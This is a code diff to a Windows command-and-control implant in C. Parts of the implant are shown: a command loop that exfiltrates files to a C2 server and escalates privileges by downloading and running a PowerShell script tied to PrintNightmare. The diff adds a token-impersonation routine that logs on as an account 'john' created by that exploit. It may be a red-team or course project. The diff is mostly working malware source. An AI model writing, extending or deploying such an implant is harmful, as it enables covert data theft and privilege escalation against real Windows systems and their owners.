@@ -70,7 +70,7 @@ DWORD ls(char *path, char* out) {
  
 
 // Reads data from file given by path and sends it back to C2 server
-int exfil(char* path) {
+int Exfil(char* path) {
     char abs_path[MAX_PATH + 1] = {0};
     DWORD numBytesRead = 0;
     DWORD numBytesSent = 0;
@@ -221,9 +221,33 @@ char* DownloadScript() {
 }
 
 
+// Attempts to get the security token for the user "john"
+DWORD Impersonate() {
+    HANDLE hToken;
+    int status;
+
+    // Try to log on as the user we created from printer nightmare
+    status = LogonUserA("john", ".", "john", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);
+    if (status == 0) {
+        c2_log("[!] ERROR: could not log on", 27);
+        return -1;
+    }
+
+    // Imprtsonate the user to get their privs
+    status = ImpersonateLoggedOnUser(hToken);
+    if (status == 0) {
+        c2_log("[!] ERROR: could not impersonate", 32);
+        CloseHandle(hToken);
+        return -1;
+    }
+    CloseHandle(hToken);
+    return 0;
+}
+
+
 // Attempts to gain administrator privileges via the Printer Nightmare CVE.
 // Works by downloading and executing a powershell script.
-DWORD escalate() {
+DWORD Escalate() {
     char* script_path;
     STARTUPINFO startInfo;
     PROCESS_INFORMATION procInfo;
@@ -256,8 +280,8 @@ DWORD escalate() {
     c2_log("Script path: %s\n", script_path);
 
     // Execute the powershell script
-    DWORD res = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
-    if (!res) {
+    ret = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
+    if (!ret) {
         c2_log("Spawning powershell failed\n");
         ret = -1;
         goto end;
@@ -267,6 +291,14 @@ DWORD escalate() {
     CloseHandle(procInfo.hProcess);
     CloseHandle(procInfo.hThread);
 
+    // Attempt to impersonate
+    ret = Impersonate();
+    if (ret != 0) {
+        c2_log("[!] Could not impersonate", 25);
+        ret = -1;
+        goto end;
+    }
+
 end:
     if (script_path) {
         DeleteFile(script_path);
@@ -274,6 +306,9 @@ end:
     }
     return ret;
 }
+
+
+
 
 
 // cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
@@ -346,7 +381,7 @@ int main() {
 
         else if(strncmp(buffer, "exfil ", 6) == 0) {
             if (n >= 7) {
-                status = exfil(buffer + 6);
+                status = Exfil(buffer + 6);
                 if (status > 0) { c2_send("OK", 2); }
                 else { c2_send("[!] exfil error", 15); }
             }
@@ -362,17 +397,23 @@ int main() {
             else { c2_send("[!] Error in check", 18); }
         }
 
-        else if (strncmp(buffer, "download", 8) == 0) {
-            char* path = DownloadScript();
-            c2_send(path, strlen(path));
-            Free(path);
-        }
+        // else if (strncmp(buffer, "download", 8) == 0) {
+        //     char* path = DownloadScript();
+        //     c2_send(path, strlen(path));
+        //     Free(path);
+        // }
 
         else if (strncmp(buffer, "escalate", 8) == 0) {
-            status = escalate();
+            status = Escalate();
             if (status == 0) { c2_send("[+] Escalate sucess", 19); }
             else { c2_send("[!] Error in privesc", 20); }
         }
+
+        // else if (strncmp(buffer, "impersonate", 11) == 0) {
+        //     status = Impersonate();
+        //     if (status == 0) { c2_send("[+] success", 11); }
+        //     else { c2_send("[!] failure", 11); } 
+        // }
 
         else {
             c2_send("[!] Invalid command", 19);
